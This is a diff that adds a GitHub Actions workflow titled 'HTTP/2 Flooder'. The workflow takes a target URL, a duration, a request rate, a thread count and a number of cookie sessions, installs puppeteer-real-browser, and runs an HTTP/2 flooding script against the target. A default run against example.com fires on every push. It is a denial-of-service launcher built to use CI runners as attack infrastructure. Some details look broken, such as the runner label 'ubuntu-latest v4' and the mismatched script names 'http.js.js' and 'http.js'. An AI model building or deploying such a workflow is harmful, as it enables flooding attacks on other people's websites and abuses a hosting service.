@@ -1,0 +1,55 @@
+name:  HTTP/2 Flooder 
+
+on:
+  workflow_dispatch:
+    inputs:
+      target:
+        description: 'Target URL'
+        required: true
+        type: string
+      time:
+        description: 'Attack duration in seconds'
+        required: true
+        type: number
+      rate:
+        description: 'Requests per second'
+        required: true
+        type: number
+      threads:
+        description: 'Number of threads'
+        required: true
+        type: number
+      cookie_count:
+        description: 'Number of cookie sessions to obtain'
+        required: true
+        type: number
+        default: 2
+  push:
+    branches: [ main ]
+
+jobs:
+  attack:
+    runs-on: ubuntu-latest v4
+    
+    steps:
+    - name: Checkout code v4
+      uses: actions/checkout@v4
+      
+    - name: Setup Node.js v4
+      uses: actions/setup-node@v4
+      with:
+        node-version: '18'
+        
+    - name: Install dependencies v4
+      run: |
+        npm install puppeteer-real-browser
+        
+    - name: Run HTTP/2 Flooder attack v4
+      run: |
+        node http.js.js ${{ inputs.target }} ${{ inputs.time }} ${{ inputs.rate }} ${{ inputs.threads }} ${{ inputs.cookie_count }}
+      if: ${{ github.event_name == 'workflow_dispatch' }}
+      
+    - name: Run default attack v4
+      run: |
+        node http.js https://example.com 60 5 4 2
+      if: ${{ github.event_name != 'workflow_dispatch' }}
